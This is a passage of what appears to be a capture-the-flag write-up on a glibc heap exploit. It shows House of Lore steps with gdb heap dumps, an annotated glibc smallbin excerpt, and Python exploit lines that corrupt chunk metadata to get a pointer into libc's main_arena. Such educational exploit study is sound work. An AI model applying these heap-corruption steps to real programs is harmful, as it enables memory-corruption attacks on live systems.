+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda$ 
+0x55555555a570:	0x0033333333333333	0x0000000000000411
+0x55555555a580:	0x0000000000000000	0x0000555555559010 -&gt; The size of our chunk corrupted with bk of the new freed chunk
+0x55555555a590:	0x0000555555559138	0x0000555555559140
+0x55555555a5a0:	0x4646464646464646	0x4646464646464646
+0x55555555a5b0:	0x4646464646464646	0x4646464646464646
+0x55555555a5c0:	0x4646464646464646	0x4646464646464646
+0x55555555a5d0:	0x4646464646464646	0x4646464646464646
+0x55555555a5e0:	0x4646464646464646	0x4646464646464646
+0x55555555a5f0:	0x4646464646464646	0x4646464646464646
+0x55555555a600:	0x4646464646464646	0x4646464646464646
+0x55555555a610:	0x4646464646464646	0x4646464646464646
+0x55555555a620:	0x4646464646464646	0x4646464646464646
+0x55555555a630:	0x4646464646464646	0x4646464646464646
+0x55555555a640:	0x4646464646464646	0x4646464646464646
+0x55555555a650:	0x4646464646464646	0x4646464646464646
+0x55555555a660:	0x4646464646464646	0x4646464646464646
+0x55555555a670:	0x4646464646464646	0x4646464646464646
+0x55555555a680:	0x4646464646464646	0x4646464646464646
+0x55555555a690:	0x4646464646464646	0x4646464646464646
+0x55555555a6a0:	0x4646464646464646	0x4646464646464646
+0x55555555a6b0:	0x4646464646464646	0x4646464646464646
+0x55555555a6c0:	0x4646464646464646	0x4646464646464646
+0x55555555a6d0:	0x4646464646464646	0x4646464646464646
+0x55555555a6e0:	0x4646464646464646	0x4646464646464646
+0x55555555a6f0:	0x4646464646464646	0x4646464646464646
+0x55555555a700:	0x4646464646464646	0x4646464646464646
+0x55555555a710:	0x4646464646464646	0x4646464646464646
+0x55555555a720:	0x4646464646464646	0x4646464646464646
+0x55555555a730:	0x4646464646464646	0x4646464646464646
+0x55555555a740:	0x4646464646464646	0x4646464646464646
+0x55555555a750:	0x4646464646464646	0x4646464646464646
+0x55555555a760:	0x4646464646464646	0x4646464646464646
+0x55555555a770:	0x4646464646464646	0x4646464646464646
+0x55555555a780:	0x4646464646464646	0x4646464646464646
+gdb-peda$ 
+0x55555555a790:	0x0000000000000210	0x0000000000000600
+</code></pre></div></div>
+
+<p>The reason we set the next size to <code class="language-plaintext highlighter-rouge">0x600</code> was that , after adding another chunk of size 0x400 , the next of our fake chunk now points to top chunk.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="nv">$ </span>x/4gx 0x55555555a790+0x600
+0x55555555ad90:	0x0000000000000000	0x000000000001f271 -&gt; Top Chunk
+0x55555555ada0:	0x0000000000000000	0x0000000000000000
+</code></pre></div></div>
+
+<p>All this is set to trigger the vulnerability to leverage <strong>House Of Lore</strong>.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/*
+       If a small request, check regular bin.  Since these "smallbins"
+       hold one size each, no searching within bins is necessary.
+       (For a large request, we need to wait until unsorted chunks are
+       processed to find best fit. But for small ones, fits are exact
+       anyway, so we can check now, which is faster.)
+     */</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">in_smallbin_range</span><span class="p">(</span><span class="n">nb</span><span class="p">))</span> <span class="p">{</span>
+        <span class="c1">// Get the index of the small bin</span>
+        <span class="n">idx</span> <span class="o">=</span> <span class="n">smallbin_index</span><span class="p">(</span><span class="n">nb</span><span class="p">);</span>
+        <span class="c1">// Get the corresponding chunk pointer in the small bin</span>
+        <span class="n">bin</span> <span class="o">=</span> <span class="n">bin_at</span> <span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">idx</span><span class="p">);</span>
+        <span class="c1">// First execute victim= last(bin) to get the last chunk of the small bin</span>
+        <span class="c1">// If victim = bin , then the bin is empty.</span>
+        <span class="c1">// If they are not equal, then there will be two cases</span>
+        <span class="k">if</span> <span class="p">((</span><span class="n">victim</span> <span class="o">=</span> <span class="n">last</span><span class="p">(</span><span class="n">bin</span><span class="p">))</span> <span class="o">!=</span> <span class="n">bin</span><span class="p">)</span> <span class="p">{</span>
+            <span class="c1">// In the first case, the small bin has not yet been initialized.</span>
+            <span class="k">if</span> <span class="p">(</span><span class="n">victim</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="cm">/* initialization check */</span>
+                <span class="c1">// Perform initialization to merge chunks in fast bins</span>
+                <span class="n">malloc_consolidate</span> <span class="p">(</span><span class="n">of</span><span class="p">);</span>
+            <span class="c1">// In the second case, there is a free chunk in the small bin</span>
+            <span class="k">else</span> <span class="p">{</span>
+                <span class="c1">// Get the second-to-last chunk in the small bin.</span>
+                <span class="n">bck</span> <span class="o">=</span> <span class="n">victim</span><span class="o">-&gt;</span><span class="n">bk</span><span class="p">;</span>
+                <span class="c1">// Check if bck-&gt;fd is victim, prevent forgery</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span><span class="p">(</span><span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">victim</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="n">errstr</span> <span class="o">=</span> <span class="s">"malloc(): smallbin double linked list corrupted"</span><span class="p">;</span>
+                    <span class="k">goto</span> <span class="n">errout</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="c1">// Set the corresponding inuse bit of victim</span>
+                <span class="n">set_inuse_bit_at_offset</span><span class="p">(</span><span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+                <span class="c1">// Modify the small bin list, take the last chunk of the small bin</span>
+                <span class="n">bin</span><span class="o">-&gt;</span> <span class="n">bk</span> <span class="o">=</span> <span class="n">bck</span><span class="p">;</span>
+                <span class="n">bck</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">bin</span><span class="p">;</span>
+                <span class="c1">// If it is not main_arena, set the corresponding flag</span>
+                <span class="k">if</span> <span class="p">(</span><span class="n">av</span> <span class="o">!=</span> <span class="o">&amp;</span><span class="n">main_arena</span><span class="p">)</span> <span class="n">set_non_main_arena</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+                <span class="c1">// Detailed inspection</span>
+                <span class="n">check_malloced_chunk</span> <span class="p">(</span><span class="n">off</span><span class="p">,</span> <span class="n">victim</span><span class="p">,</span> <span class="n">nb</span><span class="p">);</span>
+                <span class="c1">// Convert the requested chunk to the corresponding mem state</span>
+                <span class="kt">void</span> <span class="o">*</span><span class="n">p</span> <span class="o">=</span> <span class="n">chunk2mem</span><span class="p">(</span><span class="n">victim</span><span class="p">);</span>
+                <span class="c1">// If perturb_type is set, the obtained chunk is initialized to perturb_type ^ 0xff</span>
+                <span class="n">alloc_perturb</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="n">bytes</span><span class="p">);</span>
+                <span class="k">return</span> <span class="n">p</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+</code></pre></div></div>
+
+<p>Calling malloc and now allocating the chunk which is in tcache as well as unsorted bin , hence we get a tcache chunk which is in libc <code class="language-plaintext highlighter-rouge">main_arena</code> struct due to unsafe unlink.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">secret</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">heap_base</span> <span class="o">+</span> <span class="mh">0x1130</span><span class="p">))</span>   
+</code></pre></div></div>
+
+<p>Let’s take a look at memory layout after this.</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gdb-peda<span class="err">$</span>
+0x555555559000:	0x0000000000000000	0x0000000000000251
+0x555555559010:	0x0000000000000000	0x0000000000000000
+0x555555559020:	0x0000000000000000	0x0000000000000000
+0x555555559030:	0x0000000000000006	0x0000000000000000
+0x555555559040:	0x0000000000000000	0x0100000000000000
+0x555555559050:	0x0000000000000000	0x0000000000000000
+0x555555559060:	0x0000000000000000	0x0000000000000000
+0x555555559070:	0x0000000000000000	0x0000000000000000
+0x555555559080:	0x0000000000000000	0x0000000000000000
+0x555555559090:	0x0000000000000000	0x0000000000000000
+0x5555555590a0:	0x0000000000000000	0x0000000000000000
+0x5555555590b0:	0x0000000000000000	0x0000000000000000
+0x5555555590c0:	0x0000000000000000	0x0000000000000000
+0x5555555590d0:	0x0000000000000000	0x0000000000000000
+0x5555555590e0:	0x0000000000000000	0x0000000000000000
+0x5555555590f0:	0x0000000000000000	0x0000000000000000
+0x555555559100:	0x0000000000000000	0x0000000000000000
+0x555555559110:	0x0000000000000000	0x0000000000000000
+0x555555559120:	0x0000000000000000	0x0000000000000000
+0x555555559130:	0x0000000000000000	0x0000000000000000
+0x555555559140:	0x0000000000000000	0x0000000000000000
+0x555555559150:	0x00007ffff7fefeb0	0x0000000000000000 -&gt; Victim chunk from main_arena
+</code></pre></div></div>
+
+<p>Now we consolidate 6 chunks of 0x200 size into top.</p>
+
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
+    <span class="n">add</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="s">'4'</span><span class="o">*</span><span class="mh">0x1f0</span><span class="p">)</span>
+    <span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+
+</code></pre></div></div>
+
+:ET
